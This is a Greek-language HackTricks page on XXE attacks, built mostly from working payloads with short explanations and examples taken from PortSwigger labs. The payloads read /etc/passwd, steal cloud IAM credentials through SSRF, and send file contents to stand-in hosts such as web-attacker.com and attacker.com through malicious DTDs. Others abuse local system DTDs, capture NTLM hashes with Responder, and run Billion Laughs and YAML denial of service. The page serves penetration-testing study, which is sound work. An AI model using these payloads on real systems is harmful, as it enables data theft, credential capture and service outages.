# XXE - XEE - Εξωτερική Οντότητα XML

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>


## Βασικά στοιχεία XML

Το XML είναι μια γλώσσα σήμανσης σχεδιασμένη για την αποθήκευση και μεταφορά δεδομένων, παρουσιάζοντας μια ευέλικτη δομή που επιτρέπει τη χρήση ετικετών με περιγραφικά ονόματα. Αντίθετα από το HTML, δεν περιορίζεται σε ένα σύνολο προκαθορισμένων ετικετών. Η σημασία του XML έχει μειωθεί με την άνοδο του JSON, παρά τον αρχικό του ρόλο στην τεχνολογία AJAX.

- **Αναπαράσταση Δεδομένων μέσω Οντοτήτων**: Οι οντότητες στο XML επιτρέπουν την αναπαράσταση δεδομένων, συμπεριλαμβανομένων ειδικών χαρακτήρων όπως `&lt;` και `&gt;`, που αντιστοιχούν σε `<` και `>` για να αποφευχθεί η σύγκρουση με το σύστημα ετικετών του XML.

- **Ορισμός Στοιχείων XML**: Το XML επιτρέπει τον ορισμό τύπων στοιχείων, καθορίζοντας πώς πρέπει να δομηθούν τα στοιχεία και ποιο περιεχόμενο μπορούν να περιέχουν, από οποιοδήποτε είδος περιεχομένου έως συγκεκριμένα παιδικά στοιχεία.

- **Ορισμός Τύπου Εγγράφου (DTD)**: Οι DTD είναι κρίσιμοι στο XML για τον ορισμό της δομής του εγγράφου και των τύπων δεδομένων που μπορεί να περιέχει. Μπορούν να είναι εσωτερικοί, εξωτερικοί ή συνδυασμένοι, καθοδηγώντας τον τρόπο μορφοποίησης και επικύρωσης των εγγράφων.

- **Προσαρμοσμένες και Εξωτερικές Οντότητες**: Το XML υποστηρίζει τη δημιουργία προσαρμοσμένων οντοτήτων εντός ενός DTD για ευέλικτη αναπαράσταση δεδομένων. Οι εξωτερικές οντότητες, που ορίζονται με ένα URL, προκαλούν ανησυχίες ασφαλείας, ιδιαίτερα στο πλαίσιο των επιθέσεων XML External Entity (XXE), που εκμεταλλεύονται τον τρόπο με τον οποίο οι αναλυτές XML χειρίζονται εξωτερικές πηγές δεδομένων: `<!DOCTYPE foo [ <!ENTITY myentity "value" > ]>`

- **Ανίχνευση XXE με Οντότητες Παραμέτρων**: Για την ανίχνευση ευπάθειας XXE, ειδικά όταν οι συμβατικές μέθοδοι αποτυγχάνουν λόγω μέτρων ασφαλείας του αναλυτή, μπορούν να χρησιμοποιηθούν οντότητες παραμέτρων XML. Αυτές οι οντότητες επιτρέπουν τη χρήση τεχνικών ανίχνευσης εκτός πεδίου, όπως η ενεργοποίηση αναζητήσεων DNS ή αιτημάτων HTTP σε έναν ελεγχόμενο τομέα, για την επιβεβαίωση της ευπάθειας.
- `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>`
- `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://attacker.com" > ]>`


## Κύριες επιθέσεις

**[Οι περισσότερες από αυτές τις επιθέσεις δοκιμάστηκαν χρησιμοποιώντας τα εκπληκτικά εργαστήρια XEE της Portswiggers: https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)**

### Νέο τεστ Οντότητας

Σε αυτήν την επίθεση θα δοκιμάσω εάν μια απλή νέα δήλωση ΟΝΤΟΤΗΤΑΣ λειτουργεί.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
![](<../.gitbook/assets/image (220).png>)

### Διάβασμα αρχείου

Ας προσπαθήσουμε να διαβάσουμε το `/etc/passwd` με διάφορους τρόπους. Για τα Windows μπορείτε να δοκιμάσετε να διαβάσετε: `C:\windows\system32\drivers\etc\hosts`

Σε αυτήν την πρώτη περίπτωση παρατηρήστε ότι το SYSTEM "_\*\*file:///\*\*etc/passwd_" θα λειτουργήσει επίσης.
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
![](<../.gitbook/assets/image (221).png>)

Αυτή η δεύτερη περίπτωση θα πρέπει να είναι χρήσιμη για να εξάγετε ένα αρχείο εάν ο διακομιστής ιστού χρησιμοποιεί PHP (Όχι στην περίπτωση των εργαστηρίων Portswiggers)
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
Σε αυτήν την τρίτη περίπτωση παρατηρούμε ότι δηλώνουμε το `Element stockCheck` ως ΟΠΟΙΟΔΗΠΟΤΕ
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
![](<../.gitbook/assets/image (222) (1).png>)

### Λίστα καταλόγου

Σε εφαρμογές βασισμένες σε **Java**, είναι πιθανό να είναι δυνατή η **λίστα των περιεχομένων ενός καταλόγου** μέσω του XXE με ένα payload όπως (απλά ζητώντας τον κατάλογο αντί του αρχείου):
```xml
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

Ένα XXE μπορεί να χρησιμοποιηθεί για την κατάχρηση ενός SSRF εντός ενός cloud
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### Τυφλή SSRF

Χρησιμοποιώντας την **προηγουμένως σχολιασμένη τεχνική**, μπορείτε να κάνετε τον διακομιστή να αποκτήσει πρόσβαση σε έναν διακομιστή που ελέγχετε για να δείξει ότι είναι ευάλωτος. Αλλά, αν αυτό δεν λειτουργεί, ίσως είναι επειδή **δεν επιτρέπονται οι XML οντότητες**, σε αυτήν την περίπτωση μπορείτε να δοκιμάσετε να χρησιμοποιήσετε **παραμετρικές οντότητες XML**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### "Τυφλή" SSRF - Εξαγωγή δεδομένων εκτός ζώνης

**Σε αυτήν την περίπτωση θα κάνουμε τον διακομιστή να φορτώσει ένα νέο DTD με ένα κακόβουλο φορτίο που θα στείλει το περιεχόμενο ενός αρχείου μέσω αίτησης HTTP (για πολλαπλές γραμμές αρχείων μπορείτε να δοκιμάσετε να το εξαγάγετε μέσω** _**ftp://**_**). Αυτή η εξήγηση βασίζεται στο** [**εργαστήριο Portswiggers εδώ**](https://portswigger.net/web-security/xxe/blind)**.**

Στο κακόβουλο DTD που δίνεται, πραγματοποιούνται μια σειρά από βήματα για την εξαγωγή δεδομένων:

### Παράδειγμα Κακόβουλου DTD:
Η δομή είναι η εξής:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
Τα βήματα που εκτελούνται από αυτό το DTD περιλαμβάνουν:

1. **Ορισμός Οντοτήτων Παραμέτρων:**
- Δημιουργείται μια οντότητα παραμέτρου XML, `%file`, η οποία διαβάζει το περιεχόμενο του αρχείου `/etc/hostname`.
- Ορίζεται μια άλλη οντότητα παραμέτρου XML, `%eval`. Δηλώνει δυναμικά μια νέα οντότητα παραμέτρου XML, `%exfiltrate`. Η οντότητα `%exfiltrate` ορίζεται να κάνει ένα αίτημα HTTP στον διακομιστή του επιτιθέμενου, περνώντας το περιεχόμενο της οντότητας `%file` στο query string του URL.

2. **Εκτέλεση Οντοτήτων:**
- Χρησιμοποιείται η οντότητα `%eval`, οδηγώντας στην εκτέλεση της δυναμικής δήλωσης της οντότητας `%exfiltrate`.
- Στη συνέχεια, χρησιμοποιείται η οντότητα `%exfiltrate`, ενεργοποιώντας ένα αίτημα HTTP προς τον καθορισμένο URL με το περιεχόμενο του αρχείου.

Ο επιτιθέμενος φιλοξενεί αυτό το κακόβουλο DTD σε έναν διακομιστή υπό τον έλεγχό του, συνήθως σε ένα URL όπως `http://web-attacker.com/malicious.dtd`.

**Πληρωματικό Φορτίο XXE:**
Για να εκμεταλλευτεί μια ευπαθή εφαρμογή, ο επιτιθέμενος στέλνει ένα πληρωματικό φορτίο XXE:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Αυτό το payload καθορίζει ένα XML παραμετρικό entity `%xxe` και το ενσωματώνει στο DTD. Όταν επεξεργάζεται από έναν XML αναλυτή, αυτό το payload ανακτά το εξωτερικό DTD από τον διακομιστή του επιτιθέμενου. Ο αναλυτής στη συνέχεια ερμηνεύει το DTD inline, εκτελώντας τα βήματα που περιγράφονται στο κακόβουλο DTD και οδηγώντας στη διαρροή του αρχείου `/etc/hostname` στον διακομιστή του επιτιθέμενου.

### Βασισμένο σε σφάλματα (Εξωτερικό DTD)

**Σε αυτήν την περίπτωση θα κάνουμε τον διακομιστή να φορτώσει ένα κακόβουλο DTD που θα εμφανίσει το περιεχόμενο ενός αρχείου μέσα σε ένα μήνυμα σφάλματος (αυτό ισχύει μόνο αν μπορείτε να δείτε μηνύματα σφαλμάτων).** [**Παράδειγμα από εδώ.**](https://portswigger.net/web-security/xxe/blind)

Ένα μήνυμα σφάλματος ανάλυσης XML, που αποκαλύπτει το περιεχόμενο του αρχείου `/etc/passwd`, μπορεί να προκληθεί χρησιμοποιώντας ένα κακόβουλο εξωτερικό Document Type Definition (DTD). Αυτό επιτυγχάνεται μέσω των ακόλουθων βημάτων:

1. Καθορίζεται ένα παραμετρικό entity XML με το όνομα `file`, το οποίο περιέχει το περιεχόμενο του αρχείου `/etc/passwd`.
2. Καθορίζεται ένα παραμετρικό entity XML με το όνομα `eval`, το οποίο ενσωματώνει μια δυναμική δήλωση για ένα άλλο παραμετρικό entity XML με το όνομα `error`. Αυτό το entity `error`, όταν αξιολογηθεί, προσπαθεί να φορτώσει ένα μη υπαρκτό αρχείο, ενσωματώνοντας το περιεχόμενο του entity `file` ως όνομά του.
3. Επικαλείται το entity `eval`, οδηγώντας στη δυναμική δήλωση του entity `error`.
4. Η επίκληση του entity `error` οδηγεί στην προσπάθεια φόρτωσης ενός μη υπαρκτού αρχείου, παράγοντας ένα μήνυμα σφάλματος που περιλαμβάνει το περιεχόμενο του αρχείου `/etc/passwd` ως μέρος του ονόματος του αρχείου.

Το κακόβουλο εξωτερικό DTD μπορεί να επικαλεστεί με το ακόλουθο XML:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Κατά την εκτέλεση, η απόκριση του διακομιστή ιστού θα πρέπει να περιλαμβάνει ένα μήνυμα σφάλματος που εμφανίζει το περιεχόμενο του αρχείου `/etc/passwd`.


![](<../.gitbook/assets/image (223) (1).png>)

_**Παρακαλώ σημειώστε ότι ο εξωτερικός DTD μας επιτρέπει να συμπεριλάβουμε ένα entity μέσα στο δεύτερο (****`eval`****), αλλά απαγορεύεται στον εσωτερικό DTD. Επομένως, δεν μπορείτε να προκαλέσετε ένα σφάλμα χωρίς να χρησιμοποιήσετε έναν εξωτερικό DTD (συνήθως).**_

### **Βασισμένο σε σφάλματα (σύστημα DTD)**

Τι γίνεται με τις ευπάθειες του XXE όταν **οι αλληλεπιδράσεις εκτός ζώνης είναι αποκλεισμένες** (δεν είναι διαθέσιμες εξωτερικές συνδέσεις);.

Ένα κενό στην προδιαγραφή της γλώσσας XML μπορεί να **αποκαλύψει ευαίσθητα δεδομένα μέσω μηνυμάτων σφάλματος όταν ένα DTD του εγγράφου αναμειγνύει εσωτερικές και εξωτερικές δηλώσεις**. Αυτό το πρόβλημα επιτρέπει την εσωτερική επανορισμό των entities που έχουν δηλωθεί εξωτερικά, διευκολύνοντας την εκτέλεση επιθέσεων XXE βασισμένων σε σφάλματα. Τέτοιες επιθέσεις εκμεταλλεύονται την επανορισμένη καθορισμό ενός XML παραμετρικού entity, που αρχικά έχει δηλωθεί σε έναν εξωτερικό DTD, από έναν εσωτερικό DTD. Όταν οι συνδέσεις εκτός ζώνης αποκλείονται από τον διακομιστή, οι επιτιθέμενοι πρέπει να βασίζονται σε τοπικά αρχεία DTD για να πραγματοποιήσουν την επίθεση, με στόχο την πρόκληση ενός σφάλματος ανάλυσης για την αποκάλυψη ευαίσθητων πληροφοριών.


Ας θεωρήσουμε ένα σενάριο όπου το σύστημα αρχείων του διακομιστή περιέχει ένα αρχείο DTD στη διαδρομή `/usr/local/app/schema.dtd`, που καθορίζει ένα entity με το όνομα `custom_entity`. Ένας επιτιθέμενος μπορεί να προκαλέσει ένα σφάλμα ανάλυσης XML που αποκαλύπτει το περιεχόμενο του αρχείου `/etc/passwd`, υποβάλλοντας ένα υβριδικό DTD ως εξής:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
Τα παρακάτω βήματα εκτελούνται από αυτό το DTD:

- Ο ορισμός ενός XML παραμετρικού στοιχείου με το όνομα `local_dtd` περιλαμβάνει το εξωτερικό αρχείο DTD που βρίσκεται στο σύστημα αρχείων του διακομιστή.
- Πραγματοποιείται μια επανακαθορισμένη έκδοση για το παραμετρικό στοιχείο XML `custom_entity`, που αρχικά ορίζεται στο εξωτερικό DTD, για να ενθυλακώσει μια εκμετάλλευση [XXE βασισμένη σε σφάλματα](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages). Αυτή η επανακαθορισμένη έκδοση σχεδιάστηκε για να προκαλέσει ένα σφάλμα ανάλυσης, αποκαλύπτοντας το περιεχόμενο του αρχείου `/etc/passwd`.
- Χρησιμοποιώντας το στοιχείο `local_dtd`, εμπλέκεται το εξωτερικό DTD, περιλαμβάνοντας το νεοσυσταθέν `custom_entity`. Αυτή η ακολουθία ενεργειών προκαλεί την εκπομπή του μηνύματος σφάλματος που στοχεύει η εκμετάλλευση.


**Πραγματικό παράδειγμα:** Συστήματα που χρησιμοποιούν το περιβάλλον εργασίας GNOME συχνά έχουν ένα DTD στην τοποθεσία `/usr/share/yelp/dtd/docbookx.dtd` που περιέχει ένα στοιχείο που ονομάζεται `ISOamso`.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
![](<../.gitbook/assets/image (224).png>)

Καθώς αυτή η τεχνική χρησιμοποιεί ένα **εσωτερικό DTD, πρέπει πρώτα να βρείτε ένα έγκυρο**. Μπορείτε να το κάνετε **εγκαθιστώντας** το ίδιο **ΛΣ / Λογισμικό** που χρησιμοποιεί ο διακομιστής και **αναζητώντας μερικά προεπιλεγμένα DTDs**, ή **ανακτώντας μια λίστα** με **προεπιλεγμένα DTDs** μέσα στα συστήματα και **ελέγχοντας** αν υπάρχει κάποιο από αυτά:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
Για περισσότερες πληροφορίες ελέγξτε [https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind)

### Εύρεση DTDs μέσα στο σύστημα

Στο εντυπωσιακό αποθετήριο github που ακολουθεί μπορείτε να βρείτε **διαδρομές DTDs που μπορεί να υπάρχουν στο σύστημα**:

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

Επιπλέον, αν έχετε την **εικόνα Docker του θύματος συστήματος**, μπορείτε να χρησιμοποιήσετε το εργαλείο από το ίδιο αποθετήριο για να **σαρώσετε** την **εικόνα** και να **βρείτε** τη διαδρομή των **DTDs** που υπάρχουν μέσα στο σύστημα. Διαβάστε το [Readme του github](https://github.com/GoSecure/dtd-finder) για να μάθετε πώς.
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### XXE μέσω των Αναλυτών Office Open XML

Για μια πιο λεπτομερή εξήγηση αυτής της επίθεσης, **ελέγξτε το δεύτερο τμήμα από [αυτήν την εκπληκτική ανάρτηση](https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/) από την Detectify**.

Η δυνατότητα **ανεβάσματος εγγράφων Microsoft Office προσφέρεται από πολλές εφαρμογές ιστού**, οι οποίες στη συνέχεια προχωρούν στην εξαγωγή συγκεκριμένων λεπτομερειών από αυτά τα έγγραφα. Για παράδειγμα, μια εφαρμογή ιστού μπορεί να επιτρέπει στους χρήστες να εισάγουν δεδομένα ανεβάζοντας ένα φύλλο εργασίας στη μορφή XLSX. Για να εξάγει τα δεδομένα από το φύλλο εργασίας, ο αναλυτής θα χρειαστεί αναπόφευκτα να αναλύσει τουλάχιστον ένα αρχείο XML.

Για να ελεγχθεί αυτή η ευπάθεια, είναι απαραίτητο να δημιουργηθεί ένα **αρχείο Microsoft Office που περιέχει ένα φορτίο XXE**. Ο πρώτος βήμα είναι να δημιουργηθεί ένας κενός κατάλογος στον οποίο το έγγραφο μπορεί να αποσυμπιεστεί.

Αφού το έγγραφο έχει αποσυμπιεστεί, το αρχείο XML που βρίσκεται στη διαδρομή `./unzipped/word/document.xml` πρέπει να ανοιχτεί και να επεξεργαστεί σε έναν προτιμώμενο επεξεργαστή κειμένου (όπως το vim). Το XML πρέπει να τροποποιηθεί ώστε να περιλαμβάνει το επιθυμητό φορτίο XXE, συχνά ξεκινώντας με ένα αίτημα HTTP.

Οι τροποποιημένες γραμμές XML πρέπει να εισαχθούν μεταξύ των δύο ριζικών αντικειμένων XML. Είναι σημαντικό να αντικατασταθεί ο URL με έναν παρακολουθήσιμο URL για τα αιτήματα.

Τέλος, το αρχείο μπορεί να συμπιεστεί για να δημιουργηθεί το κακόβουλο αρχείο poc.docx. Από τον προηγουμένως δημιουργημένο κατάλογο "unzipped", πρέπει να εκτελεστεί η παρακάτω εντολή:

Τώρα, το δημιουργημένο αρχείο μπορεί να ανέβει στην πιθανώς ευπάθη εφαρμογή ιστού, και μπορεί να ελπίζει κανείς για την εμφάνιση ενός αιτήματος στα αρχεία καταγραφής του Burp Collaborator.


### Πρωτόκολλο Jar

Το πρωτόκολλο **jar** είναι προσβάσιμο αποκλειστικά μέσα σε **εφαρμογές Java**. Σχεδιάστηκε για να επιτρέπει την πρόσβαση σε αρχεία εντός ενός αρχείου **PKZIP** (π.χ. `.zip`, `.jar`, κλπ.), εξυπηρετώντας τόσο τοπικά όσο και απομακρυσμένα αρχεία.
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
{% hint style="danger" %}
Για να μπορέσετε να έχετε πρόσβαση σε αρχεία μέσα σε αρχεία PKZIP είναι **πολύ χρήσιμο για κατάχρηση του XXE μέσω αρχείων συστήματος DTD**. Ελέγξτε [αυτήν την ενότητα για να μάθετε πώς να καταχραστείτε αρχεία συστήματος DTD](xxe-xee-xml-external-entity.md#error-based-system-dtd).
{% endhint %}

Η διαδικασία για να έχετε πρόσβαση σε ένα αρχείο μέσα σε ένα αρχείο PKZIP μέσω του πρωτοκόλλου jar περιλαμβάνει αρκετά βήματα:

1. Ένα αίτημα HTTP γίνεται για να κατεβάσει το αρχείο zip από μια συγκεκριμένη τοποθεσία, όπως `https://download.website.com/archive.zip`.
2. Η απόκριση HTTP που περιέχει το αρχείο αποθηκεύεται προσωρινά στο σύστημα, συνήθως σε μια τοποθεσία όπως `/tmp/...`.
3. Το αρχείο αποσυμπιέζεται για να έχετε πρόσβαση στο περιεχόμενό του.
4. Το συγκεκριμένο αρχείο μέσα στο αρχείο, `file.zip`, διαβάζεται.
5. Μετά τη λειτουργία, οποιαδήποτε προσωρινά αρχεία που δημιουργήθηκαν κατά τη διάρκεια αυτής της διαδικασίας διαγράφονται.

Μια ενδιαφέρουσα τεχνική για να διακόψετε αυτήν τη διαδικασία στο δεύτερο βήμα περιλαμβάνει τη διατήρηση της σύνδεσης του διακομιστή ανοιχτής για απεριόριστο χρονικό διάστημα κατά την παροχή του αρχείου αρχείου. Εργαλεία που είναι διαθέσιμα στο [αυτό το αποθετήριο](https://github.com/GoSecure/xxe-workshop/tree/master/24_write_xxe/solution) μπορούν να χρησιμοποιηθούν για αυτόν τον σκοπό, συμπεριλαμβανομένου ενός διακομιστή Python (`slow_http_server.py`) και ενός διακομιστή Java (`slowserver.jar`).
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com:8080/evil.zip!/evil.dtd">]>
<foo>&xxe;</foo>
```
{% hint style="danger" %}
Η εγγραφή αρχείων σε έναν προσωρινό κατάλογο μπορεί να βοηθήσει στην επιδείνωση μιας άλλης ευπάθειας που σχετίζεται με μια διαδρομή διάβασης (όπως η τοπική συμπερίληψη αρχείου, ενσωμάτωση προτύπου, XSLT RCE, αποσυνεργοποίηση κ.λπ.).
{% endhint %}

### XSS
```xml
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### DoS

#### Επίθεση Billion Laugh
```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Επίθεση Yaml

YAML (YAML Ain't Markup Language) είναι μια ανθρώπινα αναγνώσιμη γλώσσα περιγραφής δεδομένων. Χρησιμοποιείται συχνά για την αναπαράσταση δεδομένων σε μορφή δομημένου κειμένου. Ωστόσο, οι επιθέσεις YAML μπορούν να εκμεταλλευτούν τις ευπάθειες του συστήματος και να προκαλέσουν διάφορα προβλήματα ασφάλειας.

Μια από τις επιθέσεις YAML είναι η επίθεση Yaml. Αυτή η επίθεση εκμεταλλεύεται την ικανότητα του YAML να αναφέρεται σε εξωτερικές οντότητες και να φορτώνει αρχεία XML από απομακρυσμένες πηγές. Αυτό μπορεί να οδηγήσει σε διάφορες ευπάθειες, όπως αποκάλυψη ευαίσθητων πληροφοριών, εκτέλεση κακόβουλου κώδικα ή αποκάλυψη αρχείων στον εξυπηρετητή.

Για να προστατευθείτε από αυτήν την επίθεση, πρέπει να ελέγξετε την είσοδο YAML και να αποτρέψετε τη φόρτωση εξωτερικών οντοτήτων ή αρχείων XML από απομακρυσμένες πηγές. Επίσης, είναι σημαντικό να εφαρμόσετε τις σωστές πρακτικές ασφαλείας για την επεξεργασία και αποθήκευση των δεδομένων YAML.
```xml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### Επίθεση Quadratic Blowup

![](<../.gitbook/assets/image (531).png>)

#### Απόκτηση NTML

Σε υπολογιστές με λειτουργικό σύστημα Windows, είναι δυνατόν να αποκτηθεί το NTML hash του χρήστη του διακομιστή ιστού, ορίζοντας έναν χειριστή responder.py:
```bash
Responder.py -I eth0 -v
```
και αποστέλλοντας το ακόλουθο αίτημα
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
Στη συνέχεια μπορείτε να προσπαθήσετε να αποκρυπτογραφήσετε το hash χρησιμοποιώντας το hashcat.

## Κρυφές επιφάνειες XXE

### XInclude

Όταν ενσωματώνετε δεδομένα πελάτη σε εξυπηρετητή XML εγγράφων, όπως αυτά σε αιτήσεις SOAP στον πίσω χώρο, ο άμεσος έλεγχος της δομής XML είναι συχνά περιορισμένος, δυσχεραίνοντας τις κλασικές επιθέσεις XXE λόγω των περιορισμών στην τροποποίηση του στοιχείου `DOCTYPE`. Ωστόσο, μια επίθεση `XInclude` παρέχει μια λύση επιτρέποντας την εισαγωγή εξωτερικών οντοτήτων μέσα σε οποιοδήποτε στοιχείο δεδομένων του XML εγγράφου. Αυτή η μέθοδος είναι αποτελεσματική ακόμα και όταν μόνο ένα μέρος των δεδομένων εντός ενός XML εγγράφου που δημιουργείται από τον εξυπηρετητή μπορεί να ελεγχθεί.

Για να εκτελέσετε μια επίθεση `XInclude`, πρέπει να δηλωθεί το namespace `XInclude` και να καθοριστεί η διαδρομή του αρχείου για την επιθυμητή εξωτερική οντότητα. Παρακάτω παρουσιάζεται ένα συνοπτικό παράδειγμα πώς μπορεί να διατυπωθεί μια τέτοια επίθεση:
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
Ελέγξτε [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) για περισσότερες πληροφορίες!

### SVG - Μεταφόρτωση Αρχείου

Τα αρχεία που μεταφορτώνονται από τους χρήστες σε ορισμένες εφαρμογές, και στη συνέχεια επεξεργάζονται στον διακομιστή, μπορούν να εκμεταλλευτούν ευπάθειες στον τρόπο που χειρίζονται τα αρχεία XML ή αρχεία που περιέχουν XML. Δημοφιλής μορφές αρχείων όπως τα έγγραφα γραφείου (DOCX) και οι εικόνες (SVG) βασίζονται σε XML.

Όταν οι χρήστες **μεταφορτώνουν εικόνες**, αυτές οι εικόνες επεξεργάζονται ή επικυρώνονται στον διακομιστή. Ακόμα και για εφαρμογές που αναμένουν μορφές όπως PNG ή JPEG, η βιβλιοθήκη επεξεργασίας εικόνας του διακομιστή μπορεί να υποστηρίζει επίσης εικόνες SVG. Το SVG, ως μορφή βασισμένη σε XML, μπορεί να εκμεταλλευτεί από επιτιθέμενους για να υποβάλουν κακόβουλες εικόνες SVG, εκθέτοντας έτσι τον διακομιστή σε ευπάθειες XXE (XML External Entity).

Παρακάτω παρουσιάζεται ένα παράδειγμα τέτοιας εκμετάλλευσης, όπου μια κακόβουλη εικόνα SVG προσπαθεί να διαβάσει αρχεία του συστήματος:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
